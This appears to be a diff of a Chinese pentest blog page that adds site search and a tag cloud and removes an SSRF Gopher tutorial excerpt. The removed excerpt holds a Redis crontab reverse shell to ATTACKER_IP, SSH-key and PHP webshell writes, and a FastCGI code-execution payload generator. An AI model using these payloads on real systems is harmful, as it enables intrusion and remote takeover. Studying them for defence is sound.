@@ -17,7 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
 <meta property="og:type" content="website">
@@ -51,7 +51,9 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
-  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
 
   <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
   <script src="/js/third-party/tags/mermaid.js" defer></script>
@@ -97,6 +99,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -105,11 +108,37 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
         
@@ -150,8 +179,9 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
+          <a href="/tags/">
         <span class="site-state-item-count">18</span>
-        <span class="site-state-item-name">标签</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -163,6 +193,37 @@
         <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
+<div class="sidebar-tags">
+  <div class="sidebar-title">标签</div>
+  <div class="tag-cloud">
+    <a href="/tags/Web安全/" style="font-size: 1.4em; color: #e74c3c;">Web安全</a>
+    <a href="/tags/渗透测试/" style="font-size: 1.6em; color: #e74c3c;">渗透测试</a>
+    <a href="/tags/框架安全/" style="font-size: 1.2em;">框架安全</a>
+    <a href="/tags/内网渗透/" style="font-size: 1.1em;">内网渗透</a>
+    <a href="/tags/权限提升/" style="font-size: 1.1em;">权限提升</a>
+    <a href="/tags/云安全/" style="font-size: 1em;">云安全</a>
+    <a href="/tags/工具/" style="font-size: 1em;">工具</a>
+    <a href="/tags/靶场/" style="font-size: 1em;">靶场</a>
+    <a href="/tags/反序列化/" style="font-size: 0.95em;">反序列化</a>
+    <a href="/tags/移动安全/" style="font-size: 0.9em;">移动安全</a>
+    <a href="/tags/代码审计/" style="font-size: 0.9em;">代码审计</a>
+    <a href="/tags/数据库安全/" style="font-size: 0.85em;">数据库安全</a>
+    <a href="/tags/后渗透/" style="font-size: 0.85em;">后渗透</a>
+    <a href="/tags/密码学/" style="font-size: 0.8em;">密码学</a>
+    <a href="/tags/认证安全/" style="font-size: 0.8em;">认证安全</a>
+    <a href="/tags/信息收集/" style="font-size: 0.75em;">信息收集</a>
+    <a href="/tags/方法论/" style="font-size: 0.75em;">方法论</a>
+    <a href="/tags/安全运维/" style="font-size: 0.75em;">安全运维</a>
+  </div>
+</div>
+
+<style>
+.sidebar-tags { margin-top: 20px; padding: 0 15px; }
+.sidebar-tags .sidebar-title { font-size: 1.1em; font-weight: bold; margin-bottom: 10px; color: #555; }
+.sidebar-tags .tag-cloud { line-height: 2; }
+.sidebar-tags .tag-cloud a { display: inline-block; margin: 0 8px 4px 0; padding: 2px 8px; border-radius: 3px; background: #f5f5f5; text-decoration: none; border-bottom: none; }
+.sidebar-tags .tag-cloud a:hover { background: #e74c3c; color: #fff !important; }
+</style>
 
         </div>
       </div>
@@ -220,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,7 +373,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -404,7 +465,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -496,7 +557,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -588,7 +649,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -680,7 +741,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:14" itemprop="dateModified" datetime="2026-06-05T13:34:14+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -772,7 +833,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -864,7 +925,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -886,172 +947,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SSRF（Server-Side Request Forgery）是渗透测试中常见的高危漏洞。在众多利用手法中，<strong>Gopher 协议</strong>因能构造任意 TCP 数据流，成为最强大的攻击载体之一。本文深入剖析 Gopher 协议在 Redis、Memcached、MySQL、FastCGI 等内网服务中的攻防实践。</p>
-<h2 id="一、Gopher-协议格式详解"><a href="#一、Gopher-协议格式详解" class="headerlink" title="一、Gopher 协议格式详解"></a>一、Gopher 协议格式详解</h2><p>Gopher 协议定义于 RFC 1436，其 URL 格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-type&gt;&lt;selector&gt;%0d%0a&lt;next-type&gt;&lt;next-selector&gt;%0d%0a...</span><br></pre></td></tr></table></figure>
-
-<p>核心要点：</p>
-<ul>
-<li><strong><code>gopher-type</code></strong>：单字符表示资源类型，<code>_</code> 表示任意数据。</li>
-<li><strong><code>%0d%0a</code></strong>：URL 编码的 CRLF（<code>\r\n</code>），分隔多段数据，使得单条 Gopher URL 可发送完整的 TCP 会话。</li>
-<li><strong>Selector 之后的内容原样发送到目标端口</strong>，不附加任何额外头部（与 HTTP 截然不同）。</li>
-</ul>
-<p>description: SSRF Gopher 协议利用——构造 GET&#x2F;POST 请求攻击内网 Redis&#x2F;MySQL&#x2F;FastCGI。<br>SSRF 利用条件：服务端使用 libcurl 且未禁用 Gopher 协议（curl 7.45.0+ 默认开启）。PHP 的 curl 扩展支持；Java 原生 <code>URL</code> 类不支持。发送一次 URL 编码通常足够；若中间件再解码，则需二次编码。</p>
-<h2 id="二、通过-Gopher-构造-GET-POST-请求"><a href="#二、通过-Gopher-构造-GET-POST-请求" class="headerlink" title="二、通过 Gopher 构造 GET&#x2F;POST 请求"></a>二、通过 Gopher 构造 GET&#x2F;POST 请求</h2><p>空格→<code>%20</code>、换行→<code>%0d%0a</code>、<code>&amp;</code>→<code>%26</code>。头部以 <code>%0d%0a%0d%0a</code> 结束。GET 请求示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://internal:80/_GET%20/api/info%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
-
-<p>POST 请求需添加 <code>Content-Type</code> 和 <code>Content-Length</code>，body 紧随双 CRLF：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://internal:80/_POST%20/api/login%20HTTP/1.1%0d%0aHost:%20internal%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2019%0d%0a%0d%0ausername=admin%26pwd=1%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
-
-<p>辅助编码脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_gopher</span>(<span class="params">host, port, raw_bytes</span>):</span><br><span class="line">    encoded = urllib.parse.quote(raw_bytes, safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;encoded&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="built_in">print</span>(gen_gopher(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, <span class="string">b&quot;*1\r\n$4\r\nPING\r\n&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<h2 id="三、攻击内网-Redis"><a href="#三、攻击内网-Redis" class="headerlink" title="三、攻击内网 Redis"></a>三、攻击内网 Redis</h2><p>Redis 使用 RESP 协议：<code>*&lt;参数数量&gt;\r\n$&lt;参数长度&gt;\r\n&lt;参数&gt;\r\n</code>。例如 <code>SET k v</code> → <code>*3\r\n$3\r\nSET\r\n$1\r\nk\r\n$1\r\nv\r\n</code>。默认 <code>0.0.0.0:6379</code> 无密码的 Redis 是 SSRF 高价值目标。</p>
-<h3 id="3-1-探测与信息收集"><a href="#3-1-探测与信息收集" class="headerlink" title="3.1 探测与信息收集"></a>3.1 探测与信息收集</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># PING 探测</span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a</span><br><span class="line"></span><br><span class="line"># 遍历 db 并获取所有键</span><br><span class="line">*2\r\n$6\r\nSELECT\r\n$1\r\n0\r\n</span><br><span class="line">*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n</span><br><span class="line">*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-写-Crontab-获取反弹-Shell（需-root-权限）"><a href="#3-2-写-Crontab-获取反弹-Shell（需-root-权限）" class="headerlink" title="3.2 写 Crontab 获取反弹 Shell（需 root 权限）"></a>3.2 写 Crontab 获取反弹 Shell（需 root 权限）</h3><p>命令序列：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>关键 RESP 片段（<code>set x</code> 的 value 中 <code>\n</code> 前后的换行不可省略）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*4\r\n$3\r\nset\r\n$1\r\nx\r\n$62\r\n\n* * * * * bash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1\n\r\n</span><br><span class="line">*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$17\r\n/var/spool/cron/\r\n</span><br><span class="line">*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n</span><br><span class="line">*1\r\n$4\r\nsave\r\n</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>系统差异：CentOS 路径 <code>/var/spool/cron/root</code>；Ubuntu 为 <code>/var/spool/cron/crontabs/root</code>。</p>
-</blockquote>
-<h3 id="3-3-写-SSH-公钥（需-root-权限）"><a href="#3-3-写-SSH-公钥（需-root-权限）" class="headerlink" title="3.3 写 SSH 公钥（需 root 权限）"></a>3.3 写 SSH 公钥（需 root 权限）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set x &quot;\nssh-rsa AAAAB3NzaC1yc2E... attacker@kali\n&quot;</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>前提：<code>/root/.ssh/</code> 目录存在且 SSH 允许公钥认证。</p>
-<h3 id="3-4-写-Webshell"><a href="#3-4-写-Webshell" class="headerlink" title="3.4 写 Webshell"></a>3.4 写 Webshell</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>适用于已知 Web 根目录且 Redis 有写权限的场景。</p>
-<h2 id="四、Memcached-利用"><a href="#四、Memcached-利用" class="headerlink" title="四、Memcached 利用"></a>四、Memcached 利用</h2><p>Memcached 默认 <code>11211</code> 端口，文本协议无认证。格式简单直接：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查询状态</span><br><span class="line">stats\r\n</span><br><span class="line"></span><br><span class="line"># 枚举 slab 并 dump 缓存键</span><br><span class="line">stats items\r\n</span><br><span class="line">stats cachedump &lt;slab_id&gt; &lt;limit&gt;\r\n</span><br><span class="line">get &lt;key&gt;\r\n</span><br><span class="line"></span><br><span class="line"># 写入数据</span><br><span class="line">set &lt;key&gt; &lt;flags&gt; &lt;exptime&gt; &lt;bytes&gt;\r\n&lt;data&gt;\r\n</span><br></pre></td></tr></table></figure>
-
-<p>Gopher 示例——写入缓存：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:11211/_set%20test%200%203600%205%0d%0ahello%0d%0a</span><br></pre></td></tr></table></figure>
-
-<p>实际利用价值：</p>
-<ul>
-<li><strong>Session 投毒</strong>：覆盖应用存储在 Memcached 中的会话实现越权。</li>
-<li><strong>缓存投毒</strong>：修改页面缓存注入恶意 JS。</li>
-<li><strong>信息泄露</strong>：读取 Token、API Key 等敏感数据。</li>
-</ul>
-<h2 id="五、MySQL-协议走私"><a href="#五、MySQL-协议走私" class="headerlink" title="五、MySQL 协议走私"></a>五、MySQL 协议走私</h2><p>MySQL 通信使用二进制协议（服务端握手 → 客户端认证 → 查询交互）。SSRF 中通常无密码，绕过思路：</p>
-<ul>
-<li><strong>Pre-Auth 利用</strong>：MySQL &lt; 5.7 时，可在握手完成前发送查询包。</li>
-<li><strong>已知凭据场景</strong>：若有泄露凭据，构造 <code>mysql_native_password</code> 认证哈希（对密码和 salt 做双重 SHA1 后 XOR），然后发送 <code>COM_QUERY</code>（<code>0x03</code> + SQL 语句）包。</li>
-<li><strong>实战建议</strong>：MySQL 二进制协议手搓复杂，推荐用 Wireshark 抓取正常会话 hex dump 后转 Gopher，或直接用 gopherus。</li>
-</ul>
-<h2 id="六、FastCGI（PHP-FPM）攻击"><a href="#六、FastCGI（PHP-FPM）攻击" class="headerlink" title="六、FastCGI（PHP-FPM）攻击"></a>六、FastCGI（PHP-FPM）攻击</h2><p>PHP-FPM 默认监听 <code>127.0.0.1:9000</code>，通过 FastCGI 二进制协议控制 PHP 执行。核心思路：通过 <code>PHP_VALUE</code> 设置 <code>auto_prepend_file = php://input</code>，将 <code>STDIN</code> 中的内容作为 PHP 代码执行。</p>
-<h3 id="6-1-数据包结构"><a href="#6-1-数据包结构" class="headerlink" title="6.1 数据包结构"></a>6.1 数据包结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-------+------+----------+-----------+------+--------+</span><br><span class="line">| Ver(1)|Type(1)|ReqID(2) |ContLen(2) |Pad(1)|Rsvd(1) | Content...</span><br><span class="line">+-------+------+----------+-----------+------+--------+</span><br></pre></td></tr></table></figure>
-
-<p>关键 Type：<code>1</code>&#x3D;BEGIN_REQUEST，<code>4</code>&#x3D;PARAMS，<code>5</code>&#x3D;STDIN。</p>
-<h3 id="6-2-构造利用载荷"><a href="#6-2-构造利用载荷" class="headerlink" title="6.2 构造利用载荷"></a>6.2 构造利用载荷</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fcgi_packet</span>(<span class="params">ptype, req_id, content</span>):</span><br><span class="line">    clen = <span class="built_in">len</span>(content)</span><br><span class="line">    plen = (<span class="number">8</span> - (clen % <span class="number">8</span>)) % <span class="number">8</span></span><br><span class="line">    hdr = struct.pack(<span class="string">&#x27;!BBHHBB&#x27;</span>, <span class="number">1</span>, ptype, req_id, clen, plen, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> hdr + content + <span class="string">b&#x27;\x00&#x27;</span> * plen</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_params</span>(<span class="params">params</span>):</span><br><span class="line">    raw = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> params.items():</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> [k.encode(), v.encode()]:</span><br><span class="line">            raw += (<span class="built_in">bytes</span>([<span class="built_in">len</span>(b)]) <span class="keyword">if</span> <span class="built_in">len</span>(b) &lt; <span class="number">128</span> <span class="keyword">else</span> struct.pack(<span class="string">&#x27;!BI&#x27;</span>, <span class="number">0x80</span>, <span class="built_in">len</span>(b)))</span><br><span class="line">        raw += k.encode() + v.encode()</span><br><span class="line">    <span class="keyword">return</span> raw</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_fastcgi_gopher</span>(<span class="params">host, port, php_path, php_code</span>):</span><br><span class="line">    rid = <span class="number">1</span></span><br><span class="line">    begin = fcgi_packet(<span class="number">1</span>, rid, <span class="string">b&#x27;\x00\x01\x01\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">    params = encode_params(&#123;</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: php_path, <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: php_path,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(php_code)),</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    raw = begin + fcgi_packet(<span class="number">4</span>, rid, params) + fcgi_packet(<span class="number">4</span>, rid, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">    raw += fcgi_packet(<span class="number">5</span>, rid, php_code.encode()) + fcgi_packet(<span class="number">5</span>, rid, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;urllib.parse.quote(raw, safe=<span class="string">&#x27;&#x27;</span>)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="built_in">print</span>(gen_fastcgi_gopher(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>,</span><br><span class="line">    <span class="string">&quot;/var/www/html/index.php&quot;</span>, <span class="string">&quot;&lt;?php system(&#x27;id&#x27;);die();?&gt;&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>关键：<code>SCRIPT_FILENAME</code> 必须指向目标服务器上真实存在的 PHP 文件（任意文件均可）。<code>CONTENT_LENGTH</code> 必须与实际 body 长度一致，否则 PHP-FPM 会等待更多数据导致超时。</p>
-<h2 id="七、gopherus-自动化工具"><a href="#七、gopherus-自动化工具" class="headerlink" title="七、gopherus 自动化工具"></a>七、gopherus 自动化工具</h2><p>Gopherus 是专为 SSRF 设计的 Gopher 载荷生成器，覆盖 MySQL(3306)、PostgreSQL(5432)、FastCGI(9000)、Redis(6379)、SMTP(25)、Zabbix(10050)、Memcached(11211)。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tarunkant/Gopherus.git</span><br><span class="line"><span class="built_in">cd</span> Gopherus &amp;&amp; pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<p><strong>Redis 示例</strong>——选择 Attack Mode 1 (crontab) 或 2 (SSH Key)，输入 HOST&#x2F;PORT&#x2F;Attacker IP 即可输出 Gopher URL：</p>
